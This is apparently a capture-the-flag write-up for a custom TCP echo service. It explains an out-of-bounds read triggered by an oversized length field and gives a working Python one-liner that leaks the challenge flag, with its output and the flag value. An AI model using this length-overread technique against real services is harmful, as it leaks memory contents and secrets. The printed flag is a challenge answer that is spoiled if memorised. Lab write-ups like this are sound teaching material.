# Net Custom Protocol (Infra)

## Challenge Description
A TCP custom echo service running at `13.206.57.188` on port `10023` that echoes back a substring of the user input.

## Analysis & Vulnerability
- **Protocol Format**:
  The server expects inputs of the form `ECHO|k|string\n`, where `k` is the length of the string to be echoed back.
- **Out of Bounds Read**:
  If the value of `k` is larger than the length of the provided `string`, the server continues reading beyond the buffer boundary and echoes adjacent memory content back to the user.

## Exploitation
By sending a request with a very large length parameter (e.g. `k = 500`), the server reads out of bounds and leaks the flag stored in adjacent memory:
```bash
$ python -c "import socket; s = socket.socket(); s.connect(('13.206.57.188', 10023)); s.sendall(b'ECHO|500|hello\n'); print(s.recv(1024)); s.close()"
b'OK|hello\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00athena{YIW80LEbHVOkxuQ8}\n'
```

Flag: `athena{YIW80LEbHVOkxuQ8}`
